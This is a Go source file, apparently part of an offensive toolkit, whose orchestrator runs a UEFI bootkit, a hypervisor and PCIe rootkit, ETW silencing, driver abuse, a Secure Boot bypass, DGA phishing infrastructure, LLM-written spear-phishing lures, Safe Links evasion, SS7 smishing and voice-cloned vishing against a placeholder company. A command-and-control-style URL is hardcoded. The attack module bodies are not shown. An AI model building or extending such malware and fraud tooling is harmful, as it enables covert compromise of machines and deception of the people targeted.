package v27

import (
	"context"
	"encoding/json"
	"sync"
)

type V27Orchestrator struct {
	Config           *V27Config
	UEFI             *UEFIBootkitEngine
	Hypervisor       *HypervisorEngine
	PCIe             *PCIeRootkitEngine
	KernelInstrument *KernelInstrumentEngine
	SecureBoot       *SecureBootBypassEngine
	PhishingInfra    *PhishingInfraEngine
	SpearPhishAI     *SpearPhishAIEngine
	AntiPhishEvasion *AntiPhishEvasionEngine
	Smishing         *SmishingEngine
	Vishing          *VishingEngine
	Status           map[string]bool
	mu               sync.Mutex
}

func NewV27Orchestrator(cfg *V27Config) *V27Orchestrator {
	return &V27Orchestrator{
		Config:           cfg,
		UEFI:             NewUEFIBootkitEngine(cfg),
		Hypervisor:       NewHypervisorEngine(cfg),
		PCIe:             NewPCIeRootkitEngine(cfg),
		KernelInstrument: NewKernelInstrumentEngine(cfg),
		SecureBoot:       NewSecureBootBypassEngine(cfg),
		PhishingInfra:    NewPhishingInfraEngine(cfg),
		SpearPhishAI:     NewSpearPhishAIEngine(cfg),
		AntiPhishEvasion: NewAntiPhishEvasionEngine(cfg),
		Smishing:         NewSmishingEngine(cfg),
		Vishing:          NewVishingEngine(cfg),
		Status:           make(map[string]bool),
	}
}

func (vo *V27Orchestrator) ExecuteAll(ctx context.Context) map[string]bool {
	vo.mu.Lock()
	defer vo.mu.Unlock()

	if vo.Config.UEFIBootkit {
		vo.UEFI.MapSPIFlash()
		vo.UEFI.InstallDXEDriver()
		vo.Status["uefi_bootkit"] = true
	}

	if vo.Config.HypervisorRing {
		vo.Hypervisor.DetectVTx()
		vo.Hypervisor.InstallBluePill()
		vo.Status["hypervisor_ring1"] = true
	}

	if vo.Config.PCIeRootkit {
		vo.PCIe.InfectGPUVRAM()
		vo.PCIe.InfectNICFirmware()
		vo.Status["pcie_rootkit"] = true
	}

	if vo.Config.KernelInstrument {
		vo.KernelInstrument.LoadeBPFPrograms()
		vo.KernelInstrument.SilenceETW()
		vo.KernelInstrument.RunBYOVD()
		vo.Status["kernel_instrument"] = true
	}

	if vo.Config.SecureBootBypass {
		vo.SecureBoot.ReplaceShim()
		vo.SecureBoot.EnrollMOK()
		vo.SecureBoot.CompromiseGRUB()
		vo.Status["secure_boot_bypass"] = true
	}

	if vo.Config.PhishingInfra {
		vo.PhishingInfra.GenerateDGADomains(5)
		vo.PhishingInfra.DeployCaddyServer()
		vo.PhishingInfra.DeployCloudflareWorker()
		vo.PhishingInfra.SetupResidentialSocks5()
		vo.Status["phishing_infra"] = true
	}

	if vo.Config.SpearPhishAI {
		vo.SpearPhishAI.ReconTarget("John Smith", "Target Corp")
		vo.SpearPhishAI.GenerateLureWithLLM()
		vo.SpearPhishAI.DeployLandingPage("microsoft365")
		vo.Status["spear_phish_ai"] = true
	}

	if vo.Config.AntiPhishEvasion {
		vo.AntiPhishEvasion.WrapURL("https://x404x-c2.online/landing")
		vo.AntiPhishEvasion.GenerateHTMLAttachment()
		vo.AntiPhishEvasion.BypassSafeLinks("https://safe-link.microsoft.com")
		vo.Status["anti_phish_evasion"] = true
	}

	if vo.Config.SmishingSMS {
		vo.Smishing.SendContextualSMS("John", "+34900000000", "Finance Director", "Target Corp")
		vo.Smishing.ExploitSS7()
		vo.Status["smishing_sms"] = true
	}

	if vo.Config.VishingVoice {
		vo.Vishing.CloneVoice("/tmp/voice_samples")
		vo.Vishing.MakeVishingCall("+34900000000", "IT Security", vo.Vishing.GenerateVishingScript("IT Security", "John", "Target Corp"))
		vo.Status["vishing_voice"] = true
	}

	return vo.Status
}

func (vo *V27Orchestrator) GetFullStatusJSON() string {
	data, _ := json.Marshal(map[string]interface{}{
		"status":               vo.Status,
		"uefi_spi_flashed":     vo.UEFI.SPIFlashed,
		"hv_ring_1":            vo.Hypervisor.BluePillActive,
		"gpu_vram":             vo.PCIe.GPUInfected,
		"ebpf_hooks":           vo.KernelInstrument.SyscallsHooked,
		"secure_boot_bypassed": vo.SecureBoot.MOKEnrolled,
		"dga_domains":          len(vo.PhishingInfra.DGADomains),
		"lures_generated":      len(vo.SpearPhishAI.GeneratedLures),
		"tokens_active":        len(vo.AntiPhishEvasion.TokenDB),
		"sms_sent":             vo.Smishing.MessagesSent,
		"calls_made":           vo.Vishing.CallsMade,
	})
	return string(data)
}
